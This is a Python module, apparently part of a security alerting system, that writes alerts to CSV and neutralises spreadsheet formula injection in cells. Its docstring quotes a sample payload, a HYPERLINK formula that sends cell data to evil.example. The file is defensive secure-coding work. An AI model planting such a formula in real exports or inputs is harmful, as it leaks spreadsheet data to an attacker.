"""CSV exports with CSV-injection protection.

CSV INJECTION: spreadsheet programs treat a cell that starts with = + - @
(or tab / carriage return) as a FORMULA. Alert titles and log lines can
contain attacker-controlled text, e.g. a user-agent of
    =HYPERLINK("http://evil.example/?d="&A1,"click")
Opening the export in Excel would then run it. We neutralise such cells by
prefixing a single quote, which makes the spreadsheet show them as text.
"""

import csv
import io
from collections.abc import Iterable

DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value) -> str:
    if value is None:
        return ""
    text = value.isoformat() if hasattr(value, "isoformat") else str(value)
    return "'" + text if text.startswith(DANGEROUS_PREFIXES) else text


def to_csv(header: list[str], rows: Iterable[Iterable]) -> bytes:
    buf = io.StringIO()
    writer = csv.writer(buf, quoting=csv.QUOTE_MINIMAL)
    writer.writerow(header)
    for row in rows:
        writer.writerow([safe_cell(v) for v in row])
    # UTF-8 with BOM so Excel shows non-English characters correctly.
    return buf.getvalue().encode("utf-8-sig")


ALERT_HEADER = ["id", "detected_at_utc", "severity", "status", "title", "source", "detection_rule_id",
                "src_ip", "dst_ip", "incident_id", "is_simulated", "raw_reference"]


def alert_rows(alerts) -> list[list]:
    return [[a.id, a.detected_at, a.severity, a.status, a.title, a.source, a.detection_rule_id, a.src_ip,
             a.dst_ip, a.incident_id, a.is_simulated, a.raw_reference] for a in alerts]
